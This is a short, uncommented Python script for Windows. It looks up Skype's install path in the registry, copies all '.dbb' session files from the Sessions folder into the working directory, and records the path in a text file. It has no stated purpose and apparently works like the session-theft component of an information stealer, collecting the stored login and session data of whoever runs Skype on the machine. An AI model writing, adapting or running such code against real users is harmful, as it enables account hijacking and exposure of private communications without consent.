import os
import shutil
import winreg

def fetch_skype_sessions():
    try:
        skype_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Skype\\Phone")
        skype_path = winreg.QueryValueEx(skype_key, "SkypePath")[0]
        winreg.CloseKey(skype_key)
        
        if not os.path.exists(skype_path):
            return False
        
        session_path = os.path.join(skype_path, "Sessions")
        if not os.path.exists(session_path):
            return False
        
        for file in os.listdir(session_path):
            if file.endswith(".dbb"):
                source_path = os.path.join(session_path, file)
                destination_path = os.path.join(os.getcwd(), file)
                shutil.copy(source_path, destination_path)
        
        with open("skype.txt", "w") as f:
            f.write(f"Skype installation path: {skype_path}")
        
        return True
    except Exception as ex:
        print(f"Error fetching Skype sessions: {ex}")
        return False

if __name__ == "__main__":
    if fetch_skype_sessions():
        print("Skype sessions fetched successfully.")
    else:
        print("Skype sessions could not be fetched.")
